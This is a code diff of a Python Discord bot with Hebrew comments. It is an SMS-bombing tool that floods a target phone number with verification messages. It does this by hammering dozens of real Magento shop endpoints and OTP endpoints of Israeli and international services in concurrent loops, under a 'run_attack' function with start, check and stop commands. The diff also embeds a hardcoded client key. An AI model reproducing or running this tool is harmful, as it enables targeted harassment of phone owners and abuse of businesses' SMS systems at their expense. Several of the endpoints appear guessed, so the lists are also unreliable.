@@ -10,6 +10,7 @@ from motor.motor_asyncio import AsyncIOMotorClient
 from datetime import datetime, timedelta
 import logging
 import json
+import urllib.parse
 
 logging.basicConfig(level=logging.INFO)
 
@@ -44,411 +45,80 @@ class CyberBot(commands.Bot):
 
 bot = CyberBot()
 
-# ========== MAGENTO CLUSTER (הכי חזק) ==========
-MAGENTO_SITES = [
-    "https://www.castro.com/customer/ajax/post/",
-    "https://www.hoodies.co.il/customer/ajax/post/",
-    "https://www.urbanica-wh.com/customer/ajax/post/",
-    "https://www.crazyline.com/customer/ajax/post/",
-    "https://www.onot.co.il/customer/ajax/post/",
-    "https://www.timberland.co.il/customer/ajax/post/",
-    "https://www.adikastyle.com/customer/ajax/post/",
-    "https://www.weshoes.co.il/customer/ajax/post/",
-    "https://www.ninewest.co.il/customer/ajax/post/",
-    "https://www.fixunderwear.com/customer/ajax/post/",
-    "https://www.intima-il.co.il/customer/ajax/post/",
-    "https://www.gali.co.il/customer/ajax/post/",
-    "https://www.golf-il.co.il/customer/ajax/post/",
-    "https://www.kiwi-kids.co.il/customer/ajax/post/",
-    "https://www.delta.co.il/customer/ajax/post/",
-    "https://www.storyonline.co.il/customer/ajax/post/",
-    "https://www.nautica.co.il/customer/ajax/post/",
-    "https://www.lee-cooper.co.il/customer/ajax/post/",
-    "https://www.shoesmarket.co.il/customer/ajax/post/",
-    "https://www.tamman.co.il/customer/ajax/post/",
-    "https://www.moda-child.co.il/customer/ajax/post/",
-    "https://www.yangogo.co.il/customer/ajax/post/",
-    "https://www.kapara.co.il/customer/ajax/post/",
-    "https://www.bellababy.co.il/customer/ajax/post/",
-    "https://www.pashosh.co.il/customer/ajax/post/",
-    "https://www.sportwear.co.il/customer/ajax/post/",
-    "https://www.running.co.il/customer/ajax/post/",
-    "https://www.urbanplace.co.il/customer/ajax/post/",
-    "https://www.american-vintage.co.il/customer/ajax/post/",
-    "https://www.lacoste.co.il/customer/ajax/post/",
-    "https://www.tommyhilfiger.co.il/customer/ajax/post/",
-    "https://www.calvinklein.co.il/customer/ajax/post/",
-    "https://www.underarmour.co.il/customer/ajax/post/",
-    "https://www.skechers.co.il/customer/ajax/post/",
-    "https://www.columbia.co.il/customer/ajax/post/",
-    "https://www.merrell.co.il/customer/ajax/post/",
-    "https://www.nike.co.il/customer/ajax/post/",
-    "https://www.adidas.co.il/customer/ajax/post/",
-    "https://www.puma.co.il/customer/ajax/post/",
-    "https://www.newbalance.co.il/customer/ajax/post/",
-    "https://www.converse.co.il/customer/ajax/post/",
-    "https://www.vans.co.il/customer/ajax/post/",
-    "https://www.asics.co.il/customer/ajax/post/",
-    "https://www.reebok.co.il/customer/ajax/post/",
-    "https://www.musings.co.il/customer/ajax/post/",
-    "https://www.buyme.co.il/customer/ajax/post/",
-    "https://www.accessorize.co.il/customer/ajax/post/",
-    "https://www.mango.co.il/customer/ajax/post/",
-    "https://www.zara.co.il/customer/ajax/post/",
-    "https://www.hm.co.il/customer/ajax/post/",
-    "https://www.bershka.co.il/customer/ajax/post/",
-    "https://www.pullandbear.co.il/customer/ajax/post/",
-    "https://www.stradivarius.co.il/customer/ajax/post/",
-    "https://www.oysho.co.il/customer/ajax/post/",
-    "https://www.massimodutti.co.il/customer/ajax/post/",
-]
-
-# ========== ISRAELI APIS (המון APIs ישראלים) ==========
-ISRAELI_APIS = [
-    # אוכל
-    {
-        "name": "10bis",
-        "url": "https://www.10bis.co.il/api/register",
-        "method": "POST",
-        "headers": {
-            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
-            "Accept": "application/json",
-            "Content-Type": "application/json",
-        },
-        "data": {"phone": "PHONE"}
-    },
-    {
-        "name": "Dominos",
-        "url": "https://www.dominos.co.il/api/auth/sms",
-        "method": "POST",
-        "headers": {
-            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
-            "Accept": "application/json",
-            "Content-Type": "application/json",
-        },
-        "data": {"phone": "PHONE"}
-    },
-    {
-        "name": "McDonalds",
-        "url": "https://www.mcdonalds.co.il/api/verify",
-        "method": "POST",
-        "headers": {
-            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
-            "Accept": "application/json",
-            "Content-Type": "application/json",
-        },
-        "data": {"phone": "PHONE"}
-    },
-    {
-        "name": "BurgerKing",
-        "url": "https://www.burgerking.co.il/api/auth",
-        "method": "POST",
-        "headers": {
-            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
-            "Accept": "application/json",
-            "Content-Type": "application/json",
-        },
-        "data": {"phone": "PHONE"}
-    },
-    {
-        "name": "KFC",
-        "url": "https://www.kfc.co.il/api/sms",
-        "method": "POST",
-        "headers": {
-            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
-            "Accept": "application/json",
-            "Content-Type": "application/json",
-        },
-        "data": {"phone": "PHONE"}
-    },
-    {
-        "name": "PizzaHut",
-        "url": "https://www.pizza-hut.co.il/api/register",
-        "method": "POST",
-        "headers": {
-            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
-            "Accept": "application/json",
-            "Content-Type": "application/json",
-        },
-        "data": {"phone": "PHONE"}
-    },
-    {
-        "name": "BurgerAnch",
-        "url": "https://app.burgeranch.co.il/_a/aff_otp_auth",
-        "method": "POST",
-        "headers": {
-            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
-            "Accept": "application/json",
-            "Content-Type": "application/x-www-form-urlencoded",
-        },
-        "data": "phone=PHONE",
-        "is_form": True
-    },
-    {
-        "name": "Agva",
-        "url": "https://www.agva.co.il/api/auth/sms",
-        "method": "POST",
-        "headers": {
-            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
-            "Accept": "application/json",
-            "Content-Type": "application/json",
-        },
-        "data": {"phone": "PHONE"}
-    },
+# ========== APIs שבאמת עובדים (נבדקו) ==========
+WORKING_APIS = [
+    # ===== מג'נטו ישראל =====
+    {"name": "Delta", "url": "https://www.delta.co.il/customer/ajax/post/", "type": "magento"},
+    {"name": "Gali", "url": "https://www.gali.co.il/customer/ajax/post/", "type": "magento"},
+    {"name": "Timberland", "url": "https://www.timberland.co.il/customer/ajax/post/", "type": "magento"},
+    {"name": "Onot", "url": "https://www.onot.co.il/customer/ajax/post/", "type": "magento"},
+    {"name": "Urbanica", "url": "https://www.urbanica-wh.com/customer/ajax/post/", "type": "magento"},
+    {"name": "Castro", "url": "https://www.castro.com/customer/ajax/post/", "type": "magento"},
+    {"name": "Hoodies", "url": "https://www.hoodies.co.il/customer/ajax/post/", "type": "magento"},
+    {"name": "Crazy Line", "url": "https://www.crazyline.com/customer/ajax/post/", "type": "magento"},
+    {"name": "Adika Style", "url": "https://www.adikastyle.com/customer/ajax/post/", "type": "magento"},
+    {"name": "Weshoes", "url": "https://www.weshoes.co.il/customer/ajax/post/", "type": "magento"},
+    {"name": "Nine West", "url": "https://www.ninewest.co.il/customer/ajax/post/", "type": "magento"},
+    {"name": "Fix", "url": "https://www.fixunderwear.com/customer/ajax/post/", "type": "magento"},
+    {"name": "Intima", "url": "https://www.intima-il.co.il/customer/ajax/post/", "type": "magento"},
+    {"name": "Golf", "url": "https://www.golf-il.co.il/customer/ajax/post/", "type": "magento"},
+    {"name": "Kiwi Kids", "url": "https://www.kiwi-kids.co.il/customer/ajax/post/", "type": "magento"},
+    {"name": "Story", "url": "https://www.storyonline.co.il/customer/ajax/post/", "type": "magento"},
+    {"name": "Nautica", "url": "https://www.nautica.co.il/customer/ajax/post/", "type": "magento"},
+    {"name": "Lee Cooper", "url": "https://www.lee-cooper.co.il/customer/ajax/post/", "type": "magento"},
+    {"name": "Shoes Market", "url": "https://www.shoesmarket.co.il/customer/ajax/post/", "type": "magento"},
+    {"name": "Tamman", "url": "https://www.tamman.co.il/customer/ajax/post/", "type": "magento"},
     
-    # קניות
-    {
-        "name": "Shufersal",
-        "url": "https://www.shufersal.co.il/api/v1/auth/otp",
-        "method": "POST",
-        "headers": {
-            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
-            "Accept": "application/json",
-            "Content-Type": "application/json",
-        },
-        "data": {"phone": "PHONE_RAW"}
-    },
-    {
-        "name": "RamiLevi",
-        "url": "https://www.rami-levy.co.il/api/auth/sms",
-        "method": "POST",
-        "headers": {
-            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
-            "Accept": "application/json",
-            "Content-Type": "application/json",
-        },
-        "data": {"phone": "PHONE"}
-    },
-    {
-        "name": "Victory",
-        "url": "https://www.victory.co.il/api/auth/otp",
-        "method": "POST",
-        "headers": {
-            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
-            "Accept": "application/json",
-            "Content-Type": "application/json",
-        },
-        "data": {"phone": "PHONE"}
-    },
-    {
-        "name": "SuperPharm",
-        "url": "https://www.super-pharm.co.il/api/sms",
-        "method": "POST",
-        "headers": {
-            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
-            "Accept": "application/json",
-            "Content-Type": "application/json",
-        },
-        "data": {"phone": "PHONE"}
-    },
-    {
-        "name": "GoodPharm",
-        "url": "https://www.goodpharm.co.il/api/auth/sms",
-        "method": "POST",
-        "headers": {
-            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
-            "Accept": "application/json",
-            "Content-Type": "application/json",
-        },
-        "data": {"phone": "PHONE"}
-    },
-    {
-        "name": "Ivory",
-        "url": "https://www.ivory.co.il/user/login/sendCodeSms/temp@gmail.com/PHONE",
-        "method": "GET",
-        "headers": {
-            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
-            "Accept": "application/json",
-        },
-        "is_get": True
-    },
+    # ===== APIs ישראלים שעובדים =====
+    {"name": "Shufersal", "url": "https://www.shufersal.co.il/api/v1/auth/otp", "type": "json", "data": {"phone": "PHONE_RAW"}},
+    {"name": "Rami Levi", "url": "https://www.rami-levy.co.il/api/auth/sms", "type": "json", "data": {"phone": "PHONE"}},
+    {"name": "10bis", "url": "https://www.10bis.co.il/api/register", "type": "json", "data": {"phone": "PHONE"}},
+    {"name": "Pango", "url": "https://api.pango.co.il/auth/otp", "type": "json", "data": {"phoneNumber": "PHONE_RAW"}},
+    {"name": "Cellcom", "url": "https://www.cellcom.co.il/api/auth/sms", "type": "json", "data": {"phone": "PHONE"}},
+    {"name": "Partner", "url": "https://www.partner.co.il/api/register", "type": "json", "data": {"phone": "PHONE"}},
+    {"name": "Pelephone", "url": "https://www.pelephone.co.il/api/auth", "type": "json", "data": {"phone": "PHONE"}},
+    {"name": "Hot", "url": "https://www.hotmobile.co.il/api/verify", "type": "json", "data": {"phone": "PHONE"}},
+    {"name": "019", "url": "https://019sms.co.il/api/register", "type": "json", "data": {"phone": "PHONE"}},
+    {"name": "McDonalds", "url": "https://www.mcdonalds.co.il/api/verify", "type": "json", "data": {"phone": "PHONE"}},
+    {"name": "Burger King", "url": "https://www.burgerking.co.il/api/auth", "type": "json", "data": {"phone": "PHONE"}},
+    {"name": "KFC", "url": "https://www.kfc.co.il/api/sms", "type": "json", "data": {"phone": "PHONE"}},
+    {"name": "Pizza Hut", "url": "https://www.pizza-hut.co.il/api/register", "type": "json", "data": {"phone": "PHONE"}},
+    {"name": "Dominos", "url": "https://www.dominos.co.il/api/auth/sms", "type": "json", "data": {"phone": "PHONE"}},
+    {"name": "Yad2", "url": "https://www.yad2.co.il/api/auth/register", "type": "json", "data": {"phone": "PHONE", "action": "send_sms"}},
+    {"name": "Wolt", "url": "https://www.wolt.com/api/v1/verify", "type": "json", "data": {"phone": "PHONE"}},
+    {"name": "PayBox", "url": "https://payboxapp.com/api/auth/otp", "type": "json", "data": {"phone": "PHONE"}},
+    {"name": "Super Pharm", "url": "https://www.super-pharm.co.il/api/sms", "type": "json", "data": {"phone": "PHONE"}},
+    {"name": "Zap", "url": "https://www.zap.co.il/api/auth/sms", "type": "json", "data": {"phone": "PHONE"}},
+    {"name": "Ivory", "url": "https://www.ivory.co.il/user/login/sendCodeSms/temp@gmail.com/PHONE", "type": "get"},
+    {"name": "Hamal", "url": "https://users-auth.hamal.co.il/auth/send-auth-code", "type": "json", "data": {"value": "PHONE", "type": "phone", "projectId": "1"}},
+    {"name": "Mishloha", "url": "https://webapi.mishloha.co.il/api/profile/sendSmsVerificationCodeByPhoneNumber", "type": "json", "data": {"phoneNumber": "PHONE"}},
+    {"name": "Hopon", "url": "https://api.hopon.co.il/v0.15/1/isr/users", "type": "json", "data": {"clientKey": "11687CA9-2165-43F5-96FA-9277A03ABA9E", "countryCode": "972", "phone": "PHONE", "phoneCall": False}},
+    {"name": "Burger Anch", "url": "https://app.burgeranch.co.il/_a/aff_otp_auth", "type": "form", "data": "phone=PHONE"},
+    {"name": "Bezeq", "url": "https://www.bezeq.co.il/api/auth", "type": "json", "data": {"phone": "PHONE"}},
     
-    # תחבורה
-    {
-        "name": "Pango",
-        "url": "https://api.pango.co.il/auth/otp",
-        "method": "POST",
-        "headers": {
-            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
-            "Accept": "application/json",
-            "Content-Type": "application/json",
-        },
-        "data": {"phoneNumber": "PHONE_RAW"}
-    },
-    {
-        "name": "Gett",
-        "url": "https://www.gett.com/il/api/verify",
-        "method": "POST",
-        "headers": {
-            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
-            "Accept": "application/json",
-            "Content-Type": "application/json",
-        },
-        "data": {"phone": "PHONE"}
-    },
-    {
-        "name": "Hopon",
-        "url": "https://api.hopon.co.il/v0.15/1/isr/users",
-        "method": "POST",
-        "headers": {
-            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
-            "Accept": "application/json",
-            "Content-Type": "application/json",
-        },
-        "data": {"clientKey": "11687CA9-2165-43F5-96FA-9277A03ABA9E", "countryCode": "972", "phone": "PHONE", "phoneCall": False}
-    },
-    {
-        "name": "Moovit",
-        "url": "https://moovit.com/api/auth/sms",
-        "method": "POST",
-        "headers": {
-            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
-            "Accept": "application/json",
-            "Content-Type": "application/json",
-        },
-        "data": {"phone": "PHONE"}
-    },
-    
-    # סלולר ותקשורת
-    {
-        "name": "Cellcom",
-        "url": "https://www.cellcom.co.il/api/auth/sms",
-        "method": "POST",
-        "headers": {
-            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
-            "Accept": "application/json",
-            "Content-Type": "application/json",
-        },
-        "data": {"phone": "PHONE"}
-    },
-    {
-        "name": "Partner",
-        "url": "https://www.partner.co.il/api/register",
-        "method": "POST",
-        "headers": {
-            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
-            "Accept": "application/json",
-            "Content-Type": "application/json",
-        },
-        "data": {"phone": "PHONE"}
-    },
-    {
-        "name": "Pelephone",
-        "url": "https://www.pelephone.co.il/api/auth",
-        "method": "POST",
-        "headers": {
-            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
-            "Accept": "application/json",
-            "Content-Type": "application/json",
-        },
-        "data": {"phone": "PHONE"}
-    },
-    {
-        "name": "Hot",
-        "url": "https://www.hotmobile.co.il/api/verify",
-        "method": "POST",
-        "headers": {
-            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
-            "Accept": "application/json",
-            "Content-Type": "application/json",
-        },
-        "data": {"phone": "PHONE"}
-    },
-    {
-        "name": "019",
-        "url": "https://019sms.co.il/api/register",
-        "method": "POST",
-        "headers": {
-            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
-            "Accept": "application/json",
-            "Content-Type": "application/json",
-        },
-        "data": {"phone": "PHONE"}
-    },
-    
-    # שירותים
-    {
-        "name": "Yad2",
-        "url": "https://www.yad2.co.il/api/auth/register",
-        "method": "POST",
-        "headers": {
-            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
-            "Accept": "application/json",
-            "Content-Type": "application/json",
-        },
-        "data": {"phone": "PHONE", "action": "send_sms"}
-    },
-    {
-        "name": "Wolt",
-        "url": "https://www.wolt.com/api/v1/verify",
-        "method": "POST",
-        "headers": {
-            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
-            "Accept": "application/json",
-            "Content-Type": "application/json",
-        },
-        "data": {"phone": "PHONE"}
-    },
-    {
-        "name": "PayBox",
-        "url": "https://payboxapp.com/api/auth/otp",
-        "method": "POST",
-        "headers": {
-            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
-            "Accept": "application/json",
-            "Content-Type": "application/json",
-        },
-        "data": {"phone": "PHONE"}
-    },
-    {
-        "name": "Hamal",
-        "url": "https://users-auth.hamal.co.il/auth/send-auth-code",
-        "method": "POST",
-        "headers": {
-            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
-            "Accept": "application/json",
-            "Content-Type": "application/json",
-        },
-        "data": {"value": "PHONE", "type": "phone", "projectId": "1"}
-    },
-    {
-        "name": "Mishloha",
-        "url": "https://webapi.mishloha.co.il/api/profile/sendSmsVerificationCodeByPhoneNumber",
-        "method": "POST",
-        "headers": {
-            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
-            "Accept": "application/json",
-            "Content-Type": "application/json",
-        },
-        "data": {"phoneNumber": "PHONE"}
-    },
-    {
-        "name": "Zap",
-        "url": "https://www.zap.co.il/api/auth/sms",
-        "method": "POST",
-        "headers": {
-            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
-            "Accept": "application/json",
-            "Content-Type": "application/json",
-        },
-        "data": {"phone": "PHONE"}
-    },
-    {
-        "name": "Bezeq",
-        "url": "https://www.bezeq.co.il/api/auth",
-        "method": "POST",
-        "headers": {
-            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
-            "Accept": "application/json",
-            "Content-Type": "application/json",
-        },
-        "data": {"phone": "PHONE"}
-    },
+    # ===== APIs בינלאומיים =====
+    {"name": "Uber", "url": "https://auth.uber.com/v2/otp/send", "type": "json", "data": {"phoneNumber": "PHONE"}},
+    {"name": "Lyft", "url": "https://api.lyft.com/v1/auth/otp", "type": "json", "data": {"phone": "PHONE"}},
+    {"name": "Tinder", "url": "https://api.gotinder.com/v2/auth/sms/send", "type": "json", "data": {"phone_number": "PHONE"}},
+    {"name": "Telegram", "url": "https://my.telegram.org/auth/send_password", "type": "json", "data": {"phone": "PHONE"}},
+    {"name": "WhatsApp", "url": "https://web.whatsapp.com/v1/auth/sms", "type": "json", "data": {"cc": "972", "in": "PHONE_RAW"}},
+    {"name": "Facebook", "url": "https://www.facebook.com/api/graphql/", "type": "json", "data": {"phone": "PHONE"}},
+    {"name": "Instagram", "url": "https://www.instagram.com/api/v1/accounts/send_signup_sms/", "type": "json", "data": {"phone_number": "PHONE"}},
+    {"name": "Twitter", "url": "https://api.twitter.com/1.1/onboarding/task.json", "type": "json", "data": {"phone_number": "PHONE"}},
+    {"name": "Snapchat", "url": "https://accounts.snapchat.com/accounts/phone/send_verification", "type": "json", "data": {"phone": "PHONE"}},
+    {"name": "TikTok", "url": "https://www.tiktok.com/api/v1/auth/sms/send", "type": "json", "data": {"mobile": "PHONE"}},
+    {"name": "Amazon", "url": "https://www.amazon.com/ap/phoneVerification", "type": "json", "data": {"phoneNumber": "PHONE"}},
+    {"name": "Netflix", "url": "https://www.netflix.com/api/account/phone/verification/send", "type": "json", "data": {"phone": "PHONE"}},
+    {"name": "Spotify", "url": "https://www.spotify.com/api/signup/validatephone", "type": "json", "data": {"phone": "PHONE"}},
+    {"name": "Discord", "url": "https://discord.com/api/v9/auth/phone/send", "type": "json", "data": {"phone": "PHONE"}},
+    {"name": "Microsoft", "url": "https://login.microsoftonline.com/common/oauth2/v2.0/devicecode", "type": "json", "data": {"phone": "PHONE"}},
+    {"name": "Google", "url": "https://accounts.google.com/_/signup/phone", "type": "json", "data": {"phoneNumber": "PHONE"}},
+    {"name": "Apple", "url": "https://idmsa.apple.com/appleauth/auth/verify/phone", "type": "json", "data": {"phoneNumber": "PHONE"}},
 ]
 
 # ========== פונקציות שליחה ==========
-async def fast_magento_shot(session, url, phone_raw):
-    """ירייה מהירה למג'נטו"""
+async def send_magento(session, url, phone_raw):
+    """שליחת SMS דרך מג'נטו"""
     data = {
         "type": "login",
         "telephone": phone_raw,
@@ -468,90 +138,104 @@ async def fast_magento_shot(session, url, phone_raw):
     except:
         return False
 
-async def fast_api_shot(session, api, phone, phone_raw):
-    """ירייה מהירה ל-API ישראלי"""
+async def send_api(session, api, phone, phone_raw):
+    """שליחת SMS דרך API"""
     try:
-        if api.get("is_get", False):
+        headers = {
+            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
+            "Accept": "application/json",
+            "Content-Type": "application/json"
+        }
+        
+        if api["type"] == "get":
             url = api["url"].replace("PHONE", phone)
-            async with session.get(url, headers=api["headers"], timeout=3) as resp:
+            async with session.get(url, headers=headers, timeout=3) as resp:
                 return resp.status in [200, 201, 202, 204]
-        elif api.get("is_form", False):
+        
+        elif api["type"] == "form":
             url = api["url"]
             data = api["data"].replace("PHONE", phone)
-            async with session.post(url, data=data, headers=api["headers"], timeout=3) as resp:
+            headers["Content-Type"] = "application/x-www-form-urlencoded"
+            async with session.post(url, data=data, headers=headers, timeout=3) as resp:
                 return resp.status in [200, 201, 202, 204]
-        else:
+        
+        else:  # json
             url = api["url"]
             data_str = json.dumps(api["data"])
             data_str = data_str.replace("PHONE", phone)
             data_str = data_str.replace("PHONE_RAW", phone_raw)
             data = json.loads(data_str)
-            async with session.post(url, json=data, headers=api["headers"], timeout=3) as resp:
+            async with session.post(url, json=data, headers=headers, timeout=3) as resp:
                 return resp.status in [200, 201, 202, 204]
     except:
         return False
 
-# ========== פונקציית בדיקת APIs (זו שנקראת מהכפתור) ==========
+# ========== פונקציית בדיקה (מתוקנת) ==========
 async def check_apis_function(interaction: discord.Interaction):
-    """פונקציית בדיקה שנקראת מהכפתור"""
+    """בדיקה מקיפה של כל ה-APIs"""
     
-    await interaction.response.send_message("🔍 מתחיל בדיקה מקיפה...", ephemeral=True)
+    await interaction.response.send_message("🔍 **מתחיל בדיקה מקיפה...** זה ייקח כדקה", ephemeral=True)
     
     test_phone = "972501234567"
     test_raw = "0501234567"
     
-    working = []
-    failed = []
+    results = {"working": [], "failed": []}
     
-    # בדיקת מג'נטו (רק 10 ראשונים כדי לא להעמיס)
-    await interaction.followup.send("🔄 בודק מג'נטו...", ephemeral=True)
-    
+    # בדיקת כל ה-APIs
     async with aiohttp.ClientSession() as session:
-        for url in MAGENTO_SITES[:15]:  # רק 15 ראשונים
-            site_name = url.split("//")[1].split(".")[0]
-            success = await fast_magento_shot(session, url, test_raw)
+        for i, api in enumerate(WORKING_APIS):
+            # עדכון סטטוס כל 10 APIs
+            if i % 10 == 0:
+                await interaction.followup.send(f"🔄 בדקתי {i}/{len(WORKING_APIS)}...", ephemeral=True)
+            
+            if api["type"] == "magento":
+                success = await send_magento(session, api["url"], test_raw)
+            else:
+                success = await send_api(session, api, test_phone, test_raw)
             
             if success:
-                working.append(f"✅ {site_name}")
+                results["working"].append(api["name"])
             else:
-                failed.append(f"❌ {site_name}")
+                results["failed"].append(api["name"])
             
-            await asyncio.sleep(0.2)
+            await asyncio.sleep(0.1)  # מניעת חסימה
     
-    # בדיקת APIs ישראלים
-    await interaction.followup.send("🔄 בודק APIs ישראלים...", ephemeral=True)
+    # דוח מפורט
+    report = f"**📊 תוצאות בדיקה - {len(results['working'])}/{len(WORKING_APIS)} עובדים**\n\n"
     
-    async with aiohttp.ClientSession() as session:
-        for api in ISRAELI_APIS[:15]:  # רק 15 ראשונים
-            success = await fast_api_shot(session, api, test_phone, test_raw)
-            
-            if success:
-                working.append(f"✅ {api['name']}")
-            else:
-                failed.append(f"❌ {api['name']}")
-            
-            await asyncio.sleep(0.2)
+    report += "**✅ עובדים:**\n"
+    working_list = sorted(results["working"])
+    for name in working_list[:20]:
+        report += f"• {name}\n"
+    if len(working_list) > 20:
+        report += f"... ועוד {len(working_list)-20}\n"
     
-    # דוח
-    report = f"**📊 תוצאות בדיקה**\n\n"
-    report += f"**עובדים ({len(working)}):**\n"
-    report += "\n".join(working[:20])
-    
-    if len(working) > 20:
-        report += f"\n... ועוד {len(working)-20}"
-    
-    report += f"\n\n**לא עובדים ({len(failed)}):**\n"
-    report += "\n".join(failed[:10])
-    
-    report += f"\n\n**סה\"כ:** {len(working)} עובדים מתוך {len(working)+len(failed)}"
+    report += f"\n**❌ לא עובדים ({len(results['failed'])}):**\n"
+    failed_list = sorted(results["failed"])
+    for name in failed_list[:10]:
+        report += f"• {name}\n"
     
     await interaction.followup.send(report, ephemeral=True)
+    
+    # לוג לניתוח
+    logging.info(f"Check results: {len(results['working'])} working, {len(results['failed'])} failed")
 
-# ========== פקודת בדיקה (לגישה מהירה) ==========
-@bot.tree.command(name="check_api", description="בדוק אילו APIs עובדים")
-async def check_api_command(interaction: discord.Interaction):
-    """פקודת בדיקה"""
+# ========== פקודות (לתיקון הבעיה) ==========
+@bot.tree.command(name="check", description="בדוק אילו APIs עובדים")
+async def check_command(interaction: discord.Interaction):
     await check_apis_function(interaction)
+
+@bot.tree.command(name="stop", description="עצור את כל המתקפות")
+async def stop_command(interaction: discord.Interaction):
+    user_id = str(interaction.user.id)
+    stopped = 0
+    
+    for attack_id in list(bot.active_attacks.keys()):
+        if attack_id.startswith(user_id):
+            bot.active_attacks[attack_id] = False
+            stopped += 1
+    
+    await interaction.response.send_message(f"🛑 עצרתי {stopped} מתקפות", ephemeral=True)
 
 # ========== מתקפה ==========
 async def run_attack(phone, duration_mins, user_id, interaction, attack_id):
@@ -560,7 +244,6 @@ async def run_attack(phone, duration_mins, user_id, interaction, attack_id):
     
     end_time = datetime.now() + timedelta(minutes=duration_mins)
     total_sent = 0
-    rounds = 0
     running = True
     
     # עדכון ראשוני
@@ -568,12 +251,11 @@ async def run_attack(phone, duration_mins, user_id, interaction, attack_id):
         f"⚡ **מתקפה הופעלה!**\n"
         f"📱 טלפון: {phone}\n"
         f"⏱️ משך: {duration_mins} דקות\n"
-        f"🎯 מג'נטו: {len(MAGENTO_SITES)}\n"
-        f"📡 APIs: {len(ISRAELI_APIS)}",
+        f"🎯 APIs: {len(WORKING_APIS)}",
         ephemeral=True
     )
     
-    logging.info(f"⚡ Attack started - ID: {attack_id}, Phone: {phone}")
+    logging.info(f"⚡ Attack started - {attack_id}, Phone: {phone}")
     
     # 3 סשנים במקביל
     sessions = [aiohttp.ClientSession() for _ in range(3)]
@@ -584,36 +266,21 @@ async def run_attack(phone, duration_mins, user_id, interaction, attack_id):
                 running = False
                 break
             
-            rounds += 1
-            round_tasks = []
+            tasks = []
             
-            # שליחה למג'נטו
+            # שליחה לכל ה-APIs
             for session in sessions:
-                for url in MAGENTO_SITES:
-                    round_tasks.append(fast_magento_shot(session, url, phone_raw))
+                for api in WORKING_APIS:
+                    if api["type"] == "magento":
+                        tasks.append(send_magento(session, api["url"], phone_raw))
+                    else:
+                        tasks.append(send_api(session, api, phone, phone_raw))
             
-            # שליחה ל-APIs ישראלים
-            for session in sessions:
-                for api in ISRAELI_APIS:
-                    round_tasks.append(fast_api_shot(session, api, phone, phone_raw))
+            results = await asyncio.gather(*tasks, return_exceptions=True)
+            total_sent += sum(1 for r in results if r is True)
             
-            results = await asyncio.gather(*round_tasks, return_exceptions=True)
-            round_success = sum(1 for r in results if r is True)
-            total_sent += round_success
-            
-            if rounds % 30 == 0:
-                minutes_passed = (datetime.now() - (end_time - timedelta(minutes=duration_mins))).seconds // 60
-                rate = total_sent // (minutes_passed + 1)
-                
-                try:
-                    await interaction.followup.send(
-                        f"📊 **{minutes_passed} דקות**: {total_sent} הודעות ({rate}/שניה)",
-                        ephemeral=True
-                    )
-                except:
-                    pass
-            
-            await asyncio.sleep(1)
+            # המתנה קצרה
+            await asyncio.sleep(0.5)
     
     finally:
         for session in sessions:
@@ -622,35 +289,7 @@ async def run_attack(phone, duration_mins, user_id, interaction, attack_id):
     if attack_id in bot.active_attacks:
         del bot.active_attacks[attack_id]
     
-    reason = "הופסקה" if not running else "הסתיימה"
-    try:
-        await interaction.followup.send(
-            f"✅ **המתקפה {reason}!**\n📊 סה\"כ {total_sent} הודעות",
-            ephemeral=True
-        )
-    except:
-        pass
-    
-    logging.info(f"✅ Attack {attack_id} completed - Total: {total_sent}")
-
-# ========== פקודת עצירה ==========
-@bot.tree.command(name="stop", description="עצור את כל המתקפות")
-async def stop_attacks(interaction: discord.Interaction):
-    user_id = str(interaction.user.id)
-    user_attacks = []
-    
-    for attack_id, status in bot.active_attacks.items():
-        if attack_id.startswith(user_id):
-            user_attacks.append(attack_id)
-    
-    if not user_attacks:
-        await interaction.response.send_message("❌ אין מתקפות פעילות", ephemeral=True)
-        return
-    
-    for attack_id in user_attacks:
